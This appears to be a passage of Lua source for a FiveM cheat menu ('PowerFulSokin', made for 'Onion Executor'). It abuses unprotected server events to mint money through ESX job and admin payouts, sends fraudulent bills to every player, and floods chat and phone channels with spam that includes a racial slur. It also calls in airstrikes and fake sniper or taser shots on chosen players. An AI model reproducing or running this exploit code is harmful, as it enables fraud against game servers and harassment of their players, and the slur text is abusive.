    local message = "我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地"
    local owner = math.random(0,1)
    local sourcePlayer = math.random(0,87)
    local channel = num
    local messages = message..message..message..message..message..message..message..message
    local phone_number = num
    TriggerServerEvent('gcPhone:_internalAddMessage', transmitter, receiver, messages, owner)
    TriggerServerEvent('gcPhone:tchat_channel', sourcePlayer, channel, messages)
end

          function esxdestroyv333()
            TriggerServerEvent("esx_jobs:caution", "give_back", 9999999999)
            TriggerServerEvent("esx_fueldelivery:pay", 9999999999)
            TriggerServerEvent("esx_carthief:pay", 9999999999)
            TriggerServerEvent("esx_godirtyjob:pay", 9999999999)
            TriggerServerEvent("esx_pizza:pay", 9999999999)
            TriggerServerEvent("esx_ranger:pay", 9999999999)
            TriggerServerEvent("esx_garbagejob:pay", 9999999999)
            TriggerServerEvent("esx_truckerjob:pay", 9999999999)
            TriggerServerEvent("AdminMenu:giveBank", 9999999999)
            TriggerServerEvent("AdminMenu:giveCash", 9999999999)
            TriggerServerEvent("esx_gopostaljob:pay", 9999999999)
            TriggerServerEvent("esx_banksecurity:pay", 9999999999)
            TriggerServerEvent("esx_slotmachine:sv:2", 9999999999)
            for c = 0, 9 do

              TriggerServerEvent("_chat:messageEntered", "PowerFullSokin", { 141, 211, 255 }, "^"..c.."PowerFullSokin - Hi Nigger!")
            end
            local pbase = GetActivePlayers()
            for i=0, #pbase do
              TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 101337)
              TriggerServerEvent("esx_billing:sendBill", GetPlayerServerId(i), "society_police", "SKRT", 13374316)
            end
          end

            
        local function jailall()
        local pbase = GetActivePlayers()
        for i=0, 256 do
            TriggerServerEvent('esx_policejob:message',  GetPlayerServerId(i), '~r~PowerFulSokin Menu its the best')
        end
      end

        local function SendMessageeveryone()
        local pbase = GetActivePlayers()
        for i=0, 256 do
            TriggerServerEvent('esx_policejob:message',  GetPlayerServerId(i), "~g~PowerSokin ~r~Menu")
        end
  end

        --[[local function SendMessageeveryone()
        local pbase = GetActivePlayers()
        for i=0, 256 do
        local message=KeyboardInput("Enter message","",1000)
            if message then
            TriggerServerEvent('esx_policejob:message',  GetPlayerServerId(i), message)
        end
      end
  end--]]

function UnemployedMoney()
    if ESX then
        ESX.TriggerServerCallback('esx_society:setJobSalary', function()
            end, 'unemployed', 0, 10000000)
    end
end

        local function ufos()
            for i=0, 300 do
            local coords = GetEntityCoords(GetPlayerPed(i), true)
                    local prop = "p_spinning_anus_s"
                    while not HasModelLoaded(GetHashKey(prop)) do 
                        Citizen.Wait(0) 
                        RequestModel(GetHashKey(prop)) 
                    end
                    local obj = CreateObject(GetHashKey(prop),coords.x,coords.y,coords.z,true,true,true)
                    if attachProp then
                        if asdh8asdh == 1 then
                            AttachEntityToEntity(obj,GetPlayerPed(i),GetPedBoneIndex(GetPlayerPed(i),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                        elseif asdh8asdh == 2 then
                            AttachEntityToEntity(obj,GetPlayerPed(i),GetPedBoneIndex(GetPlayerPed(i),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                        end
                    end 
                end
            end

        local function tabletc()
            for i=0, 300 do
            local coords = GetEntityCoords(GetPlayerPed(i), true)
                    local prop = "xm_prop_x17_sub"
                    while not HasModelLoaded(GetHashKey(prop)) do 
                        Citizen.Wait(0) 
                        RequestModel(GetHashKey(prop)) 
                    end
                    local obj = CreateObject(GetHashKey(prop),coords.x,coords.y,coords.z,true,true,true)
                    if attachProp then
                        if asdh8asdh == 1 then
                            AttachEntityToEntity(obj,GetPlayerPed(i),GetPedBoneIndex(GetPlayerPed(i),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                        elseif asdh8asdh == 2 then
                            AttachEntityToEntity(obj,GetPlayerPed(i),GetPedBoneIndex(GetPlayerPed(i),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                        end
                    end 
                end
            end

--cargobob magnet--
bobs = {
    GetHashKey("CARGOBOB"),
    GetHashKey("CARGOBOB2"),
    GetHashKey("CARGOBOB3"),
    GetHashKey("CARGOBOB4"),
}

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        veh = GetVehiclePedIsUsing(PlayerPedId())
        if IsControlJustPressed(1, 74) then
            for i = 1,#bobs do
                    rightveh = IsVehicleModel(veh, bobs[i])
                if rightveh then
                    Citizen.InvokeNative(0x7BEB0C7A235F6F3B,GetVehiclePedIsUsing(PlayerPedId()),1)
                end
            end
        end
    end
end)

RegisterCommand("removehook", function()
    veh = GetVehiclePedIsUsing(PlayerPedId())
    if Citizen.InvokeNative(0x6E08BF5B3722BAC9,veh) or Citizen.InvokeNative(0x1821D91AD4B56108,veh) then
        vehattached = Citizen.InvokeNative(0x873B82D42AC2B9E5,veh)
        Citizen.InvokeNative(0xADF7BE450512C12F,vehattached)
        Citizen.InvokeNative(0x9768CF648F54C804,veh)
    end
end, false)

local isAirstrikeRunning = false

local Airstrike = {
    ped_hash = `S_M_Y_MARINE_01`,
    vehicle_hash = `STRIKEFORCE`,
    weapon_asset = 519052682,
    spawnDistance = 750.0,
}
-- 955522731
-- 519052682

RequestModel(Airstrike.ped_hash)
RequestModel(Airstrike.vehicle_hash)
RequestWeaponAsset(Airstrike.weapon_asset, 31, 0)

local function AirstrikePlayer(player)
    if isAirstrikeRunning then
        return hasidas8dgas('Wait until the current airstrike is complete', false)
    end

    local function AirstrikeThread()
        isAirstrikeRunning = true
        
        local playerPed = GetPlayerPed(player)
        local target = GetEntityCoords(playerPed)
        local origin = target + vector3(Airstrike.spawnDistance, Airstrike.spawnDistance, 725.0)
        
        repeat
            Wait(0)
        until HasModelLoaded(Airstrike.ped_hash) and HasModelLoaded(Airstrike.vehicle_hash)
    
        repeat
            Wait(0)
        until HasWeaponAssetLoaded(Airstrike.weapon_asset)
        
        -- Create Aircraft
        local aircraft = CreateVehicle(Airstrike.vehicle_hash, origin, 0.0, true, true)
        FreezeEntityPosition(aircraft, true)
        
        -- Register with network and give up network ownership
        -- NetworkRegisterEntityAsNetworked(aircraft)
        local netVehid = NetworkGetNetworkIdFromEntity(aircraft)
        SetNetworkIdCanMigrate(netVehid, true)
        NetworkSetNetworkIdDynamic(netVehid, false)
        -- NetworkSetEntityCanBlend(netVehid, true)
        -- NetworkSetChoiceMigrateOptions(true, player)
        -- SetNetworkIdExistsOnAllMachines(netVehid, true)

        aircraft = NetToVeh(netVehid)

        -- Create pilot and block temporary events
        local pilot = CreatePedInsideVehicle(NetToVeh(netVehid), 29, Airstrike.ped_hash, -1, true, true)

        -- Give up network ownership of ped
        -- NetworkRegisterEntityAsNetworked(pilot)
        local netPedid = NetworkGetNetworkIdFromEntity(pilot)
        SetNetworkIdCanMigrate(netPedid, true)
        NetworkSetNetworkIdDynamic(netPedid, false)
        -- NetworkSetEntityCanBlend(netPedid, true)
        -- NetworkSetChoiceMigrateOptions(true, player)
        -- SetNetworkIdExistsOnAllMachines(netPedid, true)

        pilot = NetToPed(netPedid)

        SetBlockingOfNonTemporaryEvents(pilot, true)
        SetDriverAbility(pilot, 1.0)
        -- Make sure the vehicle engine is started
        SetVehicleJetEngineOn(aircraft, true)
        SetVehicleEngineOn(aircraft, true, true, true)
        
        -- Retract landing gear for fast flight
        ControlLandingGear(aircraft, 3)

        -- Disable turbulence
        SetPlaneTurbulenceMultiplier(aircraft, 0.0)

        -- Make sure the vehicle is marked as unowned by Player
        SetVehicleHasBeenOwnedByPlayer(aircraft, false)

        SetVehicleForceAfterburner(aircraft, true)
        local blip = AddBlipForEntity(aircraft)
        
        -- Disabled rockets (CExplosionEvent bypass)
        SetCurrentPedVehicleWeapon(pilot, Airstrike.weapon_asset)

        FreezeEntityPosition(aircraft, false)
        --TaskVehicleDriveToCoord(pilot, aircraft, target.x, target.y, target.z, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
        TaskPlaneMission(pilot, NetToVeh(netVehid), 0, playerPed, 0, 0, 0, 6, GetVehicleModelMaxSpeed(aircraft), 1.0, 0.0, 2000.0, 500.0)
        SetPedKeepTask(pilot, true)
        SetDriveTaskCruiseSpeed(pilot, 150.0)

        while true do
            local target = GetEntityCoords(playerPed)
            local vehCoords = GetEntityCoords(aircraft)
            local distance = GetDistanceBetweenCoords(vehCoords, target)
            --DisableVehicleWeapon(true, 519052682, aircraft, pilot)
            --SetCurrentPedVehicleWeapon(pilot, 519052682)

            if not NetworkDoesEntityExistWithNetworkId(netVehid) then
                isAirstrikeRunning = false
                -- NetworkUnregisterNetworkedEntity(pilot)
                -- NetworkUnregisterNetworkedEntity(aircraft)
                -- SetEntityAsMissionEntity(aircraft)
                -- DeletePed(pilot)
                -- DeleteVehicle(aircraft)
    
                -- RemoveBlip(blip)
                return hasidas8dgas('We lost network control, try again.', false)
            end

            if distance > 150.0 then
                TaskPlaneMission(pilot, aircraft, 0, playerPed, 0, 0, 0, 6, GetVehicleModelMaxSpeed(aircraft), 1.0, 0.0, 2000.0, 500.0)
                -- TaskVehicleDriveToCoord(pilot, aircraft, target.x, target.y, target.z, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
            end

            if distance <= 150.0 then
                --TaskVehicleShootAtCoord(pilot, coords, 0.5)
                ShootSingleBulletBetweenCoords(vehCoords.x, vehCoords.y, vehCoords.z - 2.0, target.x, target.y, target.z, 10000.0, 0, Airstrike.weapon_asset, pilot, true, false, 8000.0)
                for i = 1, 11 do
                    local coords = GetEntityCoords(aircraft)
                    local target = GetEntityCoords(playerPed)
                    local offset = target + vector3(math.random(-8.0, 8.0), math.random(-8.0, 8.0), 0.0)
                    
                    -- SetVehicleShootAtTarget(pilot, aircraft, coords.x, coords.y, coords.z)
                    -- print(offset)
                    ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z - 2.0, offset.x, offset.y, offset.z, 10000.0, 0, Airstrike.weapon_asset, pilot, true, false, 8000.0)
                    
                    Wait(100)
                end
                TaskVehicleDriveToCoord(pilot, aircraft, origin, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
                
                Wait(10000)
                NetworkUnregisterNetworkedEntity(pilot)
                NetworkUnregisterNetworkedEntity(aircraft)
                DeletePed(pilot)
                SetEntityAsMissionEntity(aircraft, true, true)
                DeleteVehicle(aircraft)
    
                RemoveBlip(blip)

                hasidas8dgas('Airstrike on %s is complete!', false)
                break
            end
            Wait(0)
        end
    
        isAirstrikeRunning = false
    end
    CreateThreadNow(AirstrikeThread)
end

local function AirstrikeWaypoint()
    if isAirstrikeRunning then
        return hasidas8dgas('Wait until the current airstrike is complete', false)
    end

    local WaypointHandle = GetFirstBlipInfoId(8)

    if not DoesBlipExist(WaypointHandle) then
        return hasidas8dgas('You must place a waypoint', false)
    end

    local function AirstrikeThread()
        isAirstrikeRunning = true

        local target = GetBlipInfoIdCoord(WaypointHandle)
        local origin = target + vector3(Airstrike.spawnDistance, Airstrike.spawnDistance, 725.0)
        repeat
            Wait(0)
        until HasModelLoaded(Airstrike.ped_hash) and HasModelLoaded(Airstrike.vehicle_hash)
    
        repeat
            Wait(0)
        until HasWeaponAssetLoaded(Airstrike.weapon_asset)
          
        -- Create Aircraft
        local aircraft = CreateVehicle(Airstrike.vehicle_hash, origin, 0.0, true, true)
        FreezeEntityPosition(aircraft, true)
        -- Create pilot and block temporary events
        local pilot = CreatePedInsideVehicle(aircraft, 29, Airstrike.ped_hash, -1, true, true)
        SetBlockingOfNonTemporaryEvents(pilot, true)
        SetDriverAbility(pilot, 1.0)
        -- Make sure the vehicle engine is started
        SetVehicleJetEngineOn(aircraft, true)
        SetVehicleEngineOn(aircraft, true, true, true)
        
        -- Retract landing gear for fast flight
        ControlLandingGear(aircraft, 3)

        -- Disable turbulence
        SetPlaneTurbulenceMultiplier(aircraft, 0.0)

        -- Make sure the vehicle is marked as unowned by Player
        SetVehicleHasBeenOwnedByPlayer(aircraft, false)

        SetVehicleForceAfterburner(aircraft, true)
        local blip = AddBlipForEntity(aircraft)
        
        -- Disabled rockets (CExplosionEvent bypass)
        SetCurrentPedVehicleWeapon(pilot, Airstrike.weapon_asset)
        
        SetVehicleWeaponsDisabled(aircraft, 2)
        FreezeEntityPosition(aircraft, false)
        TaskVehicleDriveToCoord(pilot, aircraft, target.x, target.y, target.z, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
        --TaskPlaneMission(pilot, aircraft, 0, playerPed, 0, 0, 0, 6, GetVehicleModelMaxSpeed(aircraft), 1.0, 0.0, 2000.0, 500.0)

        SetDriveTaskCruiseSpeed(pilot, 150.0)

        -- Register with network and give up network ownership
        NetworkRegisterEntityAsNetworked(aircraft)
        local netVehid = NetworkGetNetworkIdFromEntity(aircraft)
        NetworkSetNetworkIdDynamic(netVehid, false)
        SetNetworkIdCanMigrate(netVehid, true)
        NetworkSetChoiceMigrateOptions(true, player)
        SetNetworkIdExistsOnAllMachines(netVehid, true)
        
        aircraft = NetToVeh(netVehid)

        -- Give up network ownership of ped
        NetworkRegisterEntityAsNetworked(pilot)
        local netPedid = NetworkGetNetworkIdFromEntity(pilot)
        NetworkSetNetworkIdDynamic(netPedid, false)
        SetNetworkIdCanMigrate(netPedid, true)
        NetworkSetChoiceMigrateOptions(true, player)
        SetNetworkIdExistsOnAllMachines(netPedid, true)

        pilot = NetToPed(netPedid)
    
        while true do
            local vehCoords = GetEntityCoords(aircraft)
            local distance = GetDistanceBetweenCoords(vehCoords, target)

            if not DoesEntityExist(aircraft) then
                isAirstrikeRunning = false
                return hasidas8dgas('The pilot sux and crashed the jet', false)
            end

            if distance <= 150.0 then
                --TaskVehicleShootAtCoord(pilot, coords, 0.5)
                ShootSingleBulletBetweenCoords(vehCoords.x, vehCoords.y, vehCoords.z - 2.0, target.x, target.y, target.z, 10000.0, 0, Airstrike.weapon_asset, pilot, true, false, 8000.0)
                for i = 1, 11 do
                    local offset = target + vector3(math.random(-8.0, 8.0), math.random(-8.0, 8.0), 0.0)
                    local vehCoords = GetEntityCoords(aircraft)
                    -- SetVehicleShootAtTarget(pilot, aircraft, coords.x, coords.y, coords.z)
                    -- print(offset)
                    ShootSingleBulletBetweenCoords(vehCoords.x, vehCoords.y, vehCoords.z - 2.0, offset.x, offset.y, offset.z, 10000.0, 0, Airstrike.weapon_asset, pilot, true, false, 8000.0)
                    
                    Wait(100)
                end
    
                TaskVehicleDriveToCoord(pilot, aircraft, origin, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
                Wait(10000)
                DeletePed(pilot)
                
                SetEntityAsMissionEntity(aircraft)
                DeleteVehicle(aircraft)
    
                RemoveBlip(blip)

                hasidas8dgas('Airstrike on waypoint is complete!', false)
                break
            end
            Wait(0)
        end
    
        isAirstrikeRunning = false
    end
    CreateThreadNow(AirstrikeThread)
end

  local function optimizeFPS()
    ClearAllBrokenGlass()
    ClearAllHelpMessages()
    LeaderboardsReadClearAll()
    ClearBrief()
    ClearGpsFlags()
    ClearPrints()
    ClearSmallPrints()
    ClearReplayStats()
    LeaderboardsClearCacheData()
    ClearFocus()
    ClearHdArea()
    ClearPedBloodDamage(PlayerPedId())
    ClearPedWetness(PlayerPedId())
    ClearPedEnvDirt(PlayerPedId())
    ResetPedVisibleDamage(PlayerPedId())
end

    local function ClonePedlol(target)
        local ped = GetPlayerPed(target)
        local me = PlayerPedId()
        
        hat = GetPedPropIndex(ped, 0)
        hat_texture = GetPedPropTextureIndex(ped, 0)
        
        glasses = GetPedPropIndex(ped, 1)
        glasses_texture = GetPedPropTextureIndex(ped, 1)
        
        ear = GetPedPropIndex(ped, 2)
        ear_texture = GetPedPropTextureIndex(ped, 2)
        
        watch = GetPedPropIndex(ped, 6)
        watch_texture = GetPedPropTextureIndex(ped, 6)
        
        wrist = GetPedPropIndex(ped, 7)
        wrist_texture = GetPedPropTextureIndex(ped, 7)
        
        head_drawable = GetPedDrawableVariation(ped, 0)
        head_palette = GetPedPaletteVariation(ped, 0)
        head_texture = GetPedTextureVariation(ped, 0)
        
        beard_drawable = GetPedDrawableVariation(ped, 1)
        beard_palette = GetPedPaletteVariation(ped, 1)
        beard_texture = GetPedTextureVariation(ped, 1)
        
        hair_drawable = GetPedDrawableVariation(ped, 2)
        hair_palette = GetPedPaletteVariation(ped, 2)
        hair_texture = GetPedTextureVariation(ped, 2)
        
        torso_drawable = GetPedDrawableVariation(ped, 3)
        torso_palette = GetPedPaletteVariation(ped, 3)
        torso_texture = GetPedTextureVariation(ped, 3)
        
        legs_drawable = GetPedDrawableVariation(ped, 4)
        legs_palette = GetPedPaletteVariation(ped, 4)
        legs_texture = GetPedTextureVariation(ped, 4)
        
        hands_drawable = GetPedDrawableVariation(ped, 5)
        hands_palette = GetPedPaletteVariation(ped, 5)
        hands_texture = GetPedTextureVariation(ped, 5)
        
        foot_drawable = GetPedDrawableVariation(ped, 6)
        foot_palette = GetPedPaletteVariation(ped, 6)
        foot_texture = GetPedTextureVariation(ped, 6)
        
        acc1_drawable = GetPedDrawableVariation(ped, 7)
        acc1_palette = GetPedPaletteVariation(ped, 7)
        acc1_texture = GetPedTextureVariation(ped, 7)
        
        acc2_drawable = GetPedDrawableVariation(ped, 8)
        acc2_palette = GetPedPaletteVariation(ped, 8)
        acc2_texture = GetPedTextureVariation(ped, 8)
        
        acc3_drawable = GetPedDrawableVariation(ped, 9)
        acc3_palette = GetPedPaletteVariation(ped, 9)
        acc3_texture = GetPedTextureVariation(ped, 9)
        
        mask_drawable = GetPedDrawableVariation(ped, 10)
        mask_palette = GetPedPaletteVariation(ped, 10)
        mask_texture = GetPedTextureVariation(ped, 10)
        
        aux_drawable = GetPedDrawableVariation(ped, 11)
        aux_palette = GetPedPaletteVariation(ped, 11)   
        aux_texture = GetPedTextureVariation(ped, 11)

        SetPedPropIndex(me, 0, hat, hat_texture, 1)
        SetPedPropIndex(me, 1, glasses, glasses_texture, 1)
        SetPedPropIndex(me, 2, ear, ear_texture, 1)
        SetPedPropIndex(me, 6, watch, watch_texture, 1)
        SetPedPropIndex(me, 7, wrist, wrist_texture, 1)
        
        SetPedComponentVariation(me, 0, head_drawable, head_texture, head_palette)
        SetPedComponentVariation(me, 1, beard_drawable, beard_texture, beard_palette)
        SetPedComponentVariation(me, 2, hair_drawable, hair_texture, hair_palette)
        SetPedComponentVariation(me, 3, torso_drawable, torso_texture, torso_palette)
        SetPedComponentVariation(me, 4, legs_drawable, legs_texture, legs_palette)
        SetPedComponentVariation(me, 5, hands_drawable, hands_texture, hands_palette)
        SetPedComponentVariation(me, 6, foot_drawable, foot_texture, foot_palette)
        SetPedComponentVariation(me, 7, acc1_drawable, acc1_texture, acc1_palette)
        SetPedComponentVariation(me, 8, acc2_drawable, acc2_texture, acc2_palette)
        SetPedComponentVariation(me, 9, acc3_drawable, acc3_texture, acc3_palette)
        SetPedComponentVariation(me, 10, mask_drawable, mask_texture, mask_palette)
        SetPedComponentVariation(me, 11, aux_drawable, aux_texture, aux_palette)
    end

RequestWeaponAsset(`WEAPON_SNIPERRIFLE`)

local function Fakesniper(player)
    local ped = GetPlayerPed(player)
    local tLoc = GetEntityCoords(ped)

    local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
    local origin = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)



    ShootSingleBulletBetweenCoords(origin, destination, 100, true, `WEAPON_SNIPERRIFLE`, PlayerPedId(), true, false, 100.0)
end

RequestWeaponAsset(`WEAPON_STUNGUN`)

local function TazePlayer(player)
    local ped = GetPlayerPed(player)
    local tLoc = GetEntityCoords(ped)

    local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
    local origin = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)



    ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
end

FM = {}
do
    FM.Notify = function(text, type)
        if type == nil then type = NotificationType.None end
        SetNotificationTextEntry("STRING")
        if type == NotificationType.Info then
            AddTextComponentString("~b~~h~Info~h~~s~: " .. text)
        elseif type == NotificationType.Error then
            AddTextComponentString("~r~~h~Error~h~~s~: " .. text)
        elseif type == NotificationType.Alert then
            AddTextComponentString("~y~~h~Alert~h~~s~: " .. text)
        elseif type == NotificationType.Success then
            AddTextComponentString("~g~~h~Success~h~~s~: " .. text)
        else
            AddTextComponentString(text)
        end
        DrawNotification(false, false)
    end

    FM.TriggerCustomEvent = function(server, event, ...)
        local payload = msgpack.pack({...})
        if server then
            TriggerServerEventInternal(event, payload, payload:len())
        else
            TriggerEventInternal(event, payload, payload:len())
        end
    end
end

    FM.GetKeyboardInput = function(TextEntry, ExampleText, MaxStringLength)
        AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
        DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
        local blockinput = true
        while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do Citizen.Wait(0) end

        if UpdateOnscreenKeyboard() ~= 2 then
            local result = GetOnscreenKeyboardResult()
            Citizen.Wait(500)
            blockinput = false
            return result
        else
            Citizen.Wait(500)
            blockinput = false
            return nil
        end
    end

local player = GetPlayerName(PlayerId())
local username = GetPlayerName(source)

        PowerFulSokin.asdjasd97aaa("PowerFulSokin", "PowerFulSokin")
        PowerFulSokin.dasdjas78dhasd("PowerFulSokin", "Onion Executor")
        PowerFulSokin.dasgd8aysgd8a7std6a("SelfMenu", "PowerFulSokin", "Player Settings")
        PowerFulSokin.dasgd8aysgd8a7std6a("World", "PowerFulSokin", "Server Settings")
        PowerFulSokin.dasgd8aysgd8a7std6a('ESXTriggersSelf', 'SelfMenu', 'ESX Triggers Self')
        PowerFulSokin.dasgd8aysgd8a7std6a("Fuck", "PowerFulSokin", "Destroyer")
        PowerFulSokin.dasgd8aysgd8a7std6a("VehMenu", "PowerFulSokin", "Vehicle Settings")
        PowerFulSokin.dasgd8aysgd8a7std6a("ServerMenu", "PowerFulSokin", "LUA Options")
        PowerFulSokin.dasgd8aysgd8a7std6a("TeleportMenu", "PowerFulSokin", "Teleport Settings")
        PowerFulSokin.dasgd8aysgd8a7std6a('OnlinePlayerMenu', 'PowerFulSokin', 'Online Player Menu')
        PowerFulSokin.dasgd8aysgd8a7std6a('PlayerOptionsMenu', 'OnlinePlayerMenu', 'Player Options')
        PowerFulSokin.dasgd8aysgd8a7std6a('SingleWepPlayer', 'OnlinePlayerMenu', 'Single Weapon Menu')
        PowerFulSokin.dasgd8aysgd8a7std6a("WepMenu", "PowerFulSokin", "Weapon Settings")
        PowerFulSokin.dasgd8aysgd8a7std6a("SingleWepMenu", "WepMenu", "Single Weapon Menu")
        PowerFulSokin.dasgd8aysgd8a7std6a("ESXBoss", "ServerMenu", "ESX Boss Menus")
        PowerFulSokin.dasgd8aysgd8a7std6a("ESXMoney", "ServerMenu", "ESX Money Options")
        PowerFulSokin.dasgd8aysgd8a7std6a("ESXMisc", "ServerMenu", "ESX Misc Options")
        PowerFulSokin.dasgd8aysgd8a7std6a("ESXDrugs", "ServerMenu", "Server Jail")
        PowerFulSokin.dasgd8aysgd8a7std6a("MiscServerOptions", "ServerMenu", "Misc Server Options")
        PowerFulSokin.dasgd8aysgd8a7std6a('Soczek', 'PowerFulSokin', 'DzbanPiwa')
        PowerFulSokin.dasgd8aysgd8a7std6a('SpawnPeds', 'PlayerOptionsMenu', 'Spawn Peds')
        PowerFulSokin.dasgd8aysgd8a7std6a("SpawnPropsMenu", "PlayerOptionsMenu", "SpawnPropsMenu")
        PowerFulSokin.dasgd8aysgd8a7std6a("SettingsMenu", "PowerFulSokin", "Settings")
        PowerFulSokin.dasgd8aysgd8a7std6a('Models', 'SelfMenu', 'Models Options')
        PowerFulSokin.dasgd8aysgd8a7std6a("Informations", "PowerFulSokin", "Informations")
        PowerFulSokin.dasgd8aysgd8a7std6a('ESXTriggers', 'PlayerOptionsMenu', 'Esx Triggers')
        PowerFulSokin.dasgd8aysgd8a7std6a('BoostOptions', 'VehMenu', 'BoostOptions')
        PowerFulSokin.dasgd8aysgd8a7std6a('VehicleRamMenu', 'PlayerOptionsMenu', 'VehicleRamMenu')
        PowerFulSokin.dasgd8aysgd8a7std6a("crosshairs", "World", "crosshairs")
        PowerFulSokin.dasgd8aysgd8a7std6a("resources", "World", "resources")

                local allasihdasdhas8dg = { "PowerFulSokin", "resources", "crosshairs", "SelfMenu", "World", "Fuck", "VehMenu", "ServerMenu", 
                            "TeleportMenu", "OnlinePlayerMenu", "PlayerOptionsMenu", "SingleWepPlayer", "crosshairs", 
                            "SingleWepMenu", "ESXBoss", "ESXMoney", "ESXMisc", "ESXDrugs", 
                            "MiscServerOptions", "richrp", "powerrp", "wioskarp", "dzwieki", "Soczek", "SettingsMenu", "SpawnPeds",
                            "Models", "Informations", "BoostOptions", "VehicleRamMenu", "SpawnPropsMenu", "ESXTriggers", "ESXTriggersSelf"}

        local SelectedPlayer

        while hasdh8ay do
            if PowerFulSokin.asdy7as12("PowerFulSokin") then
                drawNotification("This is private version specially made for Onion Executor. Developed by sokin#1337")
                drawNotification("Fuck FiveM and Have Fun!")
                drawNotification("~h~~r~Menu ~s~is <FONT COLOR='#ff0066'>ready bitch! ~s~Rev ~r~6.9~s~")
                drawNotification("Welcome > " ..player.. "~h~~g~")
